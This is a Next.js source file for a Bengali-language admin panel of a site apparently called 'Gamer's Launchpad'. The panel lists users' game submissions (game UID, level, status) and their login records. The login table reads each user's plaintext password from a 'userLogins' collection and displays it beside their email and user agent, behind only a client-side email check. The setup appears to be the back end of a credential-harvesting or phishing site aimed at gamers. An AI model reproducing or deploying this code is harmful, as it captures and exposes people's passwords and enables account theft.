"use client";

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import AppHeader from '@/components/layout/AppHeader';
import { Loader2, Home, LogOut, Trash2 } from 'lucide-react'; 
import { onAuthStateChanged, type User, signOut } from 'firebase/auth';
import { auth, db, isFirestoreActive } from '@/lib/firebase'; 
import { collection, getDocs, query, orderBy, Timestamp, doc, deleteDoc } from "firebase/firestore";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Button } from '@/components/ui/button';
import { useToast } from "@/hooks/use-toast";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";

const ADMIN_EMAIL = "easywish000@gmail.com";

interface Submission {
  id: string;
  userId: string;
  userEmail?: string;
  gameName?: string; 
  uid: string;
  level: string;
  status: string;
  submittedAt: Timestamp;
}

interface LoginActivity {
  id: string;
  email: string;
  loggedInAt: Timestamp;
  userId: string;
  password?: string;
  userAgent?: string;
}

export default function AdminPage() {
  const router = useRouter();
  const { toast } = useToast();
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isAuthorized, setIsAuthorized] = useState(false);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [isLoadingSubmissions, setIsLoadingSubmissions] = useState(true);
  const [loginActivities, setLoginActivities] = useState<LoginActivity[]>([]);
  const [isLoadingLoginActivities, setIsLoadingLoginActivities] = useState(true);

  const [submissionToDelete, setSubmissionToDelete] = useState<Submission | null>(null);
  const [loginActivityToDelete, setLoginActivityToDelete] = useState<LoginActivity | null>(null);


  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
      if (currentUser) {
        setUser(currentUser);
        if (currentUser.email === ADMIN_EMAIL) {
          setIsAuthorized(true);
          if (isFirestoreActive()) { 
            fetchSubmissions();
            fetchLoginActivities();
          } else {
            setIsLoadingSubmissions(false);
            setIsLoadingLoginActivities(false);
            console.error("DEBUG: AdminPage - Firestore is not active. Cannot fetch data.");
            toast({
                variant: "destructive",
                title: "ডাটাবেস ত্রুটি",
                description: "অ্যাডমিন প্যানেলের জন্য ডাটাবেস সঠিকভাবে লোড হয়নি। অনুগ্রহ করে Firebase কনফিগারেশন পরীক্ষা করুন।",
            });
          }
        } else {
          setIsAuthorized(false);
          router.replace('/');
        }
      } else {
        setUser(null);
        setIsAuthorized(false);
        router.replace('/login');
      }
      setIsLoading(false);
    });

    return () => unsubscribe();
  }, [router, toast]);

  const fetchSubmissions = async () => {
    if (!isFirestoreActive()) {
        console.error("DEBUG: fetchSubmissions - Firestore is not active.");
        return;
    }
    setIsLoadingSubmissions(true);
    try {
      const q = query(collection(db, "submissions"), orderBy("submittedAt", "desc"));
      const querySnapshot = await getDocs(q);
      const subs = querySnapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      } as Submission));
      setSubmissions(subs);
    } catch (error) {
      console.error("DEBUG: Error fetching submissions: ", error);
      toast({
        variant: "destructive",
        title: "জমা দেওয়া তথ্য আনতে ত্রুটি",
        description: "ব্যবহারকারীদের জমা দেওয়া তথ্য আনতে সমস্যা হয়েছে। Firestore Security Rules অথবা নেটওয়ার্ক পরীক্ষা করুন।",
      });
    } finally {
      setIsLoadingSubmissions(false);
    }
  };

  const fetchLoginActivities = async () => {
    if (!isFirestoreActive()) {
        console.error("DEBUG: fetchLoginActivities - Firestore is not active.");
        return;
    }
    setIsLoadingLoginActivities(true);
    console.log("DEBUG: Fetching login activities...");
    try {
      const q = query(collection(db, "userLogins"), orderBy("loggedInAt", "desc"));
      const querySnapshot = await getDocs(q);
      const activities = querySnapshot.docs.map(doc => {
        const data = doc.data();
        console.log("DEBUG: Login activity data from Firestore for doc ID", doc.id, ":", JSON.stringify(data, (key, value) => key === 'password' ? '******' : value, 2));
        return {
          id: doc.id,
          ...data
        } as LoginActivity;
      });
      console.log("DEBUG: Processed login activities:", JSON.stringify(activities, (key, value) => key === 'password' ? '******' : value, 2));
      setLoginActivities(activities);
    } catch (error) {
      console.error("DEBUG: Error fetching login activities: ", error);
       toast({
        variant: "destructive",
        title: "লগইন কার্যকলাপ আনতে ত্রুটি",
        description: "ব্যবহারকারীদের লগইন কার্যকলাপ আনতে সমস্যা হয়েছে। Firestore Security Rules অথবা নেটওয়ার্ক পরীক্ষা করুন।",
      });
    } finally {
      setIsLoadingLoginActivities(false);
    }
  };

  const handlePanelLogout = async () => {
    try {
      await signOut(auth);
      toast({
        title: "লগআউট সফল হয়েছে",
        description: "কন্ট্রোল প্যানেল থেকে সফলভাবে লগআউট হয়েছেন।",
      });
      router.push('/login');
    } catch (error) {
      console.error("DEBUG: Panel logout error: ", error);
      toast({
        variant: "destructive",
        title: "লগআউট ব্যর্থ হয়েছে",
        description: "লগআউট করার সময় একটি সমস্যা হয়েছে।",
      });
    }
  };

  const handleDeleteSubmission = async () => {
    if (!submissionToDelete) return;

    if (!isFirestoreActive()) {
        toast({
            variant: "destructive",
            title: "পরিষেবা ত্রুটি",
            description: "ডাটাবেস পরিষেবার সাথে সংযোগ স্থাপন করা যাচ্ছে না।"
        });
        setSubmissionToDelete(null);
        return;
    }
    
    const { id: submissionId, uid: submissionUid, userEmail: submissionUserEmail, userId: submissionUserId, gameName: submissionGameName } = submissionToDelete;

    try {
      await deleteDoc(doc(db, "submissions", submissionId));
      setSubmissions(prevSubmissions => prevSubmissions.filter(sub => sub.id !== submissionId));

      toast({
        title: "সফলভাবে মুছে ফেলা হয়েছে",
        description: `সাবমিশন (${submissionGameName ? submissionGameName + ' - ' : ''}${submissionUid} - ${submissionUserEmail || submissionUserId}) ডাটাবেস থেকে সফলভাবে মুছে ফেলা হয়েছে।`,
      });

    } catch (firestoreError: any) { 
      console.error("DEBUG: Error deleting submission from Firestore: ", firestoreError);
      let firestoreErrorMessage = "ডাটাবেস থেকে তথ্য মুছে ফেলার সময় একটি ত্রুটি হয়েছে।";
      if (typeof firestoreError === 'object' && firestoreError !== null && 'code' in firestoreError) {
        const fbError = firestoreError as { code: string; message: string };
        if (fbError.code === 'permission-denied') {
            firestoreErrorMessage = "ডাটাবেস থেকে এই তথ্যটি মুছে ফেলার অনুমতি আপনার নেই। Firebase Rules পরীক্ষা করুন।";
        } else {
            firestoreErrorMessage = `ডাটাবেস ত্রুটি: ${fbError.message} (Code: ${fbError.code})`;
        }
      }
      toast({
        variant: "destructive",
        title: "মুছে ফেলতে ব্যর্থ",
        description: firestoreErrorMessage,
      });
    } finally {
      setSubmissionToDelete(null);
    }
  };

  const handleDeleteLoginActivity = async () => {
    if (!loginActivityToDelete) return;
    if (!isFirestoreActive()) {
      toast({
        variant: "destructive",
        title: "পরিষেবা ত্রুটি",
        description: "ডাটাবেস পরিষেবার সাথে সংযোগ স্থাপন করা যাচ্ছে না।"
      });
      setLoginActivityToDelete(null);
      return;
    }

    const { id: activityId, email: activityEmail } = loginActivityToDelete;
    try {
      await deleteDoc(doc(db, "userLogins", activityId));
      setLoginActivities(prevActivities => prevActivities.filter(act => act.id !== activityId));
      toast({
        title: "সফলভাবে মুছে ফেলা হয়েছে",
        description: `লগইন কার্যকলাপ (${activityEmail}) ডাটাবেস থেকে সফলভাবে মুছে ফেলা হয়েছে।`,
      });
    } catch (error: any) {
      console.error("DEBUG: Error deleting login activity from Firestore: ", error);
      let errorMessage = "ডাটাবেস থেকে লগইন কার্যকলাপ মুছে ফেলার সময় একটি ত্রুটি হয়েছে।";
      if (typeof error === 'object' && error !== null && 'code' in error) {
        const fbError = error as { code: string; message: string };
        if (fbError.code === 'permission-denied') {
          errorMessage = "ডাটাবেস থেকে এই লগইন কার্যকলাপটি মুছে ফেলার অনুমতি আপনার নেই। Firebase Rules পরীক্ষা করুন।";
        } else {
          errorMessage = `ডাটাবেস ত্রুটি: ${fbError.message} (Code: ${fbError.code})`;
        }
      }
      toast({
        variant: "destructive",
        title: "মুছে ফেলতে ব্যর্থ",
        description: errorMessage,
      });
    } finally {
      setLoginActivityToDelete(null);
    }
  };


  if (isLoading) {
    return (
      <div className="flex min-h-screen flex-col items-center justify-center bg-background">
        <Loader2 className="h-12 w-12 animate-spin text-primary" />
        <p className="mt-4 text-lg text-foreground">লোড হচ্ছে...</p>
      </div>
    );
  }

  if (!isAuthorized) {
    return (
        <div className="flex min-h-screen flex-col items-center justify-center bg-background">
            <p className="mt-4 text-lg text-destructive">প্রবেশাধিকার নাই।</p>
            <Button variant="link" onClick={() => router.push('/login')} className="mt-4">লগইন পৃষ্ঠায় যান</Button>
      </div>
    );
  }

  return (
    <div className="flex flex-col min-h-screen bg-gradient-to-br from-background to-slate-900">
      <AppHeader />
      <title>অ্যাডমিন প্যানেল - Gamer's Launchpad</title>
      <main className="flex-grow flex flex-col items-center p-6">
        <Card className="w-full max-w-6xl shadow-2xl bg-card">
          <CardHeader>
            <CardTitle className="text-3xl font-headline text-center text-primary">অ্যাডমিন কন্ট্রোল প্যানেল</CardTitle>
            <CardDescription className="text-center">
              এখান থেকে আপনি ব্যবহারকারীদের জমা দেওয়া তথ্য এবং লগইন কার্যকলাপ দেখতে ও পরিচালনা করতে পারবেন।
            </CardDescription>
          </CardHeader>
          <CardContent className="space-y-8">
            <section>
              <h3 className="text-2xl font-semibold mb-3 text-primary-foreground">ব্যবহারকারীদের লগইন কার্যকলাপ</h3>
              {isLoadingLoginActivities ? (
                <div className="flex justify-center items-center py-10">
                  <Loader2 className="h-8 w-8 animate-spin text-primary" />
                  <p className="ml-3 text-muted-foreground">লগইন তথ্য লোড হচ্ছে...</p>
                </div>
              ) : loginActivities.length === 0 ? (
                <p className="text-muted-foreground text-center py-5">এখনও কোনো লগইন কার্যকলাপ রেকর্ড করা হয়নি।</p>
              ) : (
                <div className="overflow-x-auto rounded-md border">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>ইমেইল</TableHead>
                        <TableHead>পাসওয়ার্ড</TableHead>
                        <TableHead>ব্যবহারকারী আইডি</TableHead>
                        <TableHead>লগইনের সময়</TableHead>
                        <TableHead>ইউজার এজেন্ট</TableHead>
                        <TableHead>মুছে ফেলুন</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {loginActivities.map((activity) => {
                        console.log("DEBUG: Rendering login activity:", JSON.stringify(activity, (key, value) => key === 'password' ? '******' : value, 2));
                        return (
                            <TableRow key={activity.id}>
                            <TableCell>{activity.email}</TableCell>
                            <TableCell className="text-destructive font-mono">{activity.password || 'N/A'}</TableCell>
                            <TableCell>{activity.userId}</TableCell>
                            <TableCell>{activity.loggedInAt ? new Date(activity.loggedInAt.seconds * 1000).toLocaleString('bn-BD', { dateStyle: 'medium', timeStyle: 'short' }) : 'N/A'}</TableCell>
                            <TableCell className="text-xs max-w-xs truncate">{activity.userAgent || 'N/A'}</TableCell>
                            <TableCell>
                                <AlertDialog>
                                  <AlertDialogTrigger asChild>
                                    <Button variant="ghost" size="icon" onClick={() => setLoginActivityToDelete(activity)} className="text-destructive hover:text-destructive/80">
                                      <Trash2 className="h-4 w-4" />
                                    </Button>
                                  </AlertDialogTrigger>
                                  { loginActivityToDelete && loginActivityToDelete.id === activity.id && (
                                    <AlertDialogContent>
                                      <AlertDialogHeader>
                                        <AlertDialogTitle>লগইন কার্যকলাপ মুছে ফেলার নিশ্চিতকরণ</AlertDialogTitle>
                                        <AlertDialogDescription>
                                          আপনি কি নিশ্চিতভাবে এই লগইন কার্যকলাপটি (`{loginActivityToDelete.email}` - `{new Date(loginActivityToDelete.loggedInAt.seconds * 1000).toLocaleString('bn-BD')}`) মুছে ফেলতে চান? এটি আর পুনরুদ্ধার করা যাবে না।
                                        </AlertDialogDescription>
                                      </AlertDialogHeader>
                                      <AlertDialogFooter>
                                        <AlertDialogCancel onClick={() => setLoginActivityToDelete(null)}>বাতিল করুন</AlertDialogCancel>
                                        <AlertDialogAction onClick={handleDeleteLoginActivity} className="bg-destructive hover:bg-destructive/90 text-destructive-foreground">
                                          মুছে ফেলুন
                                        </AlertDialogAction>
                                      </AlertDialogFooter>
                                    </AlertDialogContent>
                                  )}
                                </AlertDialog>
                              </TableCell>
                            </TableRow>
                        );
                       })}
                    </TableBody>
                  </Table>
                </div>
              )}
            </section>
            <section>
              <h3 className="text-2xl font-semibold mb-3 text-primary-foreground">জমা দেওয়া তথ্য</h3>
              {isLoadingSubmissions ? (
                <div className="flex justify-center items-center py-10">
                  <Loader2 className="h-8 w-8 animate-spin text-primary" />
                  <p className="ml-3 text-muted-foreground">তথ্য লোড হচ্ছে...</p>
                </div>
              ) : submissions.length === 0 ? (
                <p className="text-muted-foreground text-center py-5">এখনও কোনো তথ্য জমা পড়েনি।</p>
              ) : (
                <div className="overflow-x-auto rounded-md border">
                  <Table>
                    <TableHeader>
                      <TableRow>
                        <TableHead>জমাদানকারী ইমেইল</TableHead>
                        <TableHead>গেমের নাম</TableHead>
                        <TableHead>গেম UID</TableHead>
                        <TableHead>লেভেল</TableHead>
                        <TableHead>স্ট্যাটাস</TableHead>
                        <TableHead>জমা দেওয়ার সময়</TableHead>
                        <TableHead>মুছে ফেলুন</TableHead>
                      </TableRow>
                    </TableHeader>
                    <TableBody>
                      {submissions.map((sub) => (
                        <TableRow key={sub.id}>
                          <TableCell>{sub.userEmail || sub.userId}</TableCell>
                          <TableCell>{sub.gameName || 'N/A'}</TableCell>
                          <TableCell>{sub.uid}</TableCell>
                          <TableCell>{sub.level}</TableCell>
                          <TableCell>
                            <Badge variant={sub.status === 'pending' ? 'secondary' : sub.status === 'approved' ? 'default' : 'destructive'}>
                              {sub.status === 'pending' ? 'বিবেচনাধীন' : sub.status === 'approved' ? 'অনুমোদিত' : sub.status === 'rejected' ? 'প্রত্যাখ্যাত' : sub.status}
                            </Badge>
                          </TableCell>
                          <TableCell>{sub.submittedAt ? new Date(sub.submittedAt.seconds * 1000).toLocaleString('bn-BD', { dateStyle: 'medium', timeStyle: 'short' }) : 'N/A'}</TableCell>
                          <TableCell>
                            <AlertDialog>
                              <AlertDialogTrigger asChild>
                                <Button variant="ghost" size="icon" onClick={() => setSubmissionToDelete(sub)} className="text-destructive hover:text-destructive/80">
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </AlertDialogTrigger>
                              { submissionToDelete && submissionToDelete.id === sub.id && (
                                <AlertDialogContent>
                                  <AlertDialogHeader>
                                    <AlertDialogTitle>জমা দেওয়া তথ্য মুছে ফেলার নিশ্চিতকরণ</AlertDialogTitle>
                                    <AlertDialogDescription>
                                      আপনি কি নিশ্চিতভাবে এই জমাটি ({submissionToDelete.gameName ? `${submissionToDelete.gameName} - ` : ''}`{submissionToDelete.uid}` - `{submissionToDelete.userEmail || submissionToDelete.userId}`) মুছে ফেলতে চান? এটি আর পুনরুদ্ধার করা যাবে না।
                                    </AlertDialogDescription>
                                  </AlertDialogHeader>
                                  <AlertDialogFooter>
                                    <AlertDialogCancel onClick={() => setSubmissionToDelete(null)}>বাতিল করুন</AlertDialogCancel>
                                    <AlertDialogAction onClick={handleDeleteSubmission} className="bg-destructive hover:bg-destructive/90 text-destructive-foreground">
                                      মুছে ফেলুন
                                    </AlertDialogAction>
                                  </AlertDialogFooter>
                                </AlertDialogContent>
                              )}
                            </AlertDialog>
                          </TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </div>
              )}
            </section>
          </CardContent>
          <CardFooter className="flex flex-col sm:flex-row justify-center items-center gap-4 pt-8 border-t mt-8">
             <Button variant="outline" size="lg" asChild>
                <Link href="/">
                    <Home className="mr-2 h-5 w-5" />
                    হোম পেজে ফিরে যান
                </Link>
            </Button>
            <Button variant="destructive" size="lg" onClick={handlePanelLogout}>
                <LogOut className="mr-2 h-5 w-5" />
                প্যানেল থেকে লগআউট
            </Button>
          </CardFooter>
        </Card>
      </main>
    </div>
  );
}

    